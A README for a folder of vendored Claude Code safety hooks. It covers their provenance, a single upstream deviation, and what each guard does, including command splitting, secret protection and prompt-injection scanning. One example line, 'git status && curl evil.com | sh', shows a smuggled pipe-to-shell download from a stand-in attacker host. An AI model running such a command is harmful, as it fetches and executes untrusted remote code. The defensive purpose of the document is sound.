# Vendored hooks

Upstream hook scripts, copied in verbatim. **Do not hand-edit anything in this
directory.** Each file is byte-pinned against its upstream test suite; a local
edit silently diverges from the tests that make it trustworthy. Configure via
environment variables in `.claude/settings.json`, or fork the file out of
`vendor/` under a new name if you really need different behaviour.

Shawn's own hand-maintained hooks live one level up in `.claude/hooks/`.

## Provenance

Vendored 2026-09-21.

| Directory | Upstream | Commit | License |
|---|---|---|---|
| `guard-pack/` | karanb192/claude-code-hooks | `888ef0827f121d583fb3a07c6253a297787946dc` | MIT |
| `dead-rules-audit/` | karanb192/claude-code-hooks | `888ef0827f121d583fb3a07c6253a297787946dc` | MIT |
| `format-code/` | karanb192/claude-code-hooks | `888ef0827f121d583fb3a07c6253a297787946dc` | MIT |
| `smart-approve/` | liberzon/claude-hooks | `db5713da06d31e74f48923873abd0d9ce325679d` | MIT |
| `prompt-injection-defender/` | lasso-security/claude-hooks (branch `dev`) | `8fbfd14c2a2271fe58a95c416b3b31880458c7bc` | MIT |

## Deviations from upstream

Exactly one, and it must stay exactly one. Anything added here is a thing that
breaks on the next re-vendor, so the bar is "the repo gate refuses the file
otherwise", not "I preferred it this way".

| File | Line | Change | Why |
|---|---|---|---|
| `smart-approve/smart_approve.py` | 95 | upstream author's home-directory path → `/path/to`, inside a `#` comment | `scripts/verify-clean.py` blocks the commit on `regex[user-path]`. Upstream's example glob hardcodes their own home directory. The change is inside a comment, so behaviour is byte-identical even though the file is not. |

Note the path itself is deliberately not written out above — quoting it here
re-trips the same gate on this file. That is the gate working, not a bug.

Re-apply this after any re-vendor, or the commit will be refused again.

## What each one does

**`guard-pack/`** — `PreToolUse` on `Bash|Read|Edit|MultiEdit|Write|Agent|Task`.
Seven guards in one Node process (~35 ms) instead of seven Node startups:
`subagent-spawn-cap`, `config-guard`, `block-dangerous-commands`,
`protect-secrets`, `protect-tests`, `git-safety`, `case-insensitive-guard`.
First blocking verdict wins. `lib/` holds the seven guard modules.

**`smart-approve/`** — `PreToolUse` on `Bash`. Splits compound commands on
`&&`, `||`, `;`, `|`, `$()`, backticks and newlines, then checks each
sub-command against `permissions.allow` / `permissions.deny`. Without it,
`git status && curl evil.com | sh` matches the `Bash(git:*)` allow entry and
runs unchecked. This is what makes the permissions block mean anything.

**`prompt-injection-defender/`** — `PostToolUse` on
`Read|WebFetch|Bash|Grep|Task`. Regex-scans tool output for indirect prompt
injection (instruction override, DAN, base64/hex/leetspeak/homoglyph/zero-width
obfuscation, fake system roles, HTML-comment smuggling). Patterns live in
`patterns.yaml` — that file IS meant to be extended locally; adding a pattern
is the supported customization. Warns, never blocks.

**`dead-rules-audit/`** — `SessionStart` + `PostToolUse` (async) + `SessionEnd`.
Tallies which `CLAUDE.md` rules get followed vs. ignored and flags chronically
ignored ones as candidates for promotion into a deterministic hook.

**`format-code/`** — `PostToolUse` on `Write|Edit`. ruff for `.py`, prettier for
`.js/.ts/.json/.md/.yaml/.yml/.html`.

## Configuration

Set in the `env` block of `.claude/settings.json`:

| Variable | Default here | Effect |
|---|---|---|
| `HOOK_SAFETY_LEVEL` | `high` | `critical` / `high` / `strict` across all seven guards |
| `CONFIG_GUARD_ALLOW` | `true` | **`true` disables config-guard entirely** (`guard-pack.js`: `skip: () => envBool('CONFIG_GUARD_ALLOW')`). Set here because config-guard blocks `claude plugin install/uninstall`, which this workflow does constantly. |
| `HOOK_ASK_CRITICAL` / `_HIGH` / `_STRICT` | unset | `true` prompts instead of denying at that level |
| `HOOK_SAFETY_LEVEL` note | | Per-guard levels require installing the individual guard plugins instead of the pack |

## Prerequisites

Verified present on this machine 2026-09-21: node v22.12.0, python 3.12.7,
pyyaml 6.0.2, uv 0.11.16.

**Missing: `prettier` and `ruff`.** `format-code` degrades quietly without them
— it logs an ERROR line to `~/.claude/hooks-logs/` and returns `{}`, so nothing
breaks, but nothing is formatted either. Install them to make that hook live.

## Updating

Re-clone upstream, diff, copy, bump the commit hashes in the table above, and
re-run the smoke tests in `../README.md`. Do not merge local changes back in.
